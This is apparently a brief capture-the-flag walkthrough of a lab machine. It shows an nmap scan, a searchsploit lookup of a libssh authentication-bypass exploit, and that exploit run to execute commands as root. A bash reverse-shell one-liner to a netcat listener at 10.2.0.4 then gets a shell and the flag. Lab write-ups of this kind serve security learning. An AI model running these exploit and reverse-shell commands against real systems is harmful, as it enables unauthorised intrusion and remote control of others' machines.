* [Recon-Enumeration](#recon-enumeration)
* [Exploit](#exploit)

## Recon-Enumeration  
nmap -A -p- 10.2.0.5  
![alt text](./img/firstmachine01.PNG?raw=true)  


Ok, verfy feel options to work. Let’s try to search some exploit for libssh

## Exploit  
searchsploit libssh  
![alt text](./img/firstmachine02.PNG?raw=true)  

Reading the code it asks 3 arguments... hostname, port and command  
![alt text](./img/firstmachine03.PNG?raw=true)  

python3 46307.py 10.2.0.5 8140 whoami  
![alt text](./img/firstmachine04.PNG?raw=true)  

Wow, we have root. Let’s try to get an reverse shell  

Setup an netcat listener  
	nc -nvlp 1234

And run the command  
python3 46307.py 10.2.0.5 8140 "bash -c 'exec bash -i &>/dev/tcp/10.2.0.4/1234 <&1'"  
![alt text](./img/firstmachine05.PNG?raw=true)  
HABEMUS SHELL \o/

Since we are root, just grab the flag  
![alt text](./img/firstmachine06.PNG?raw=true)  
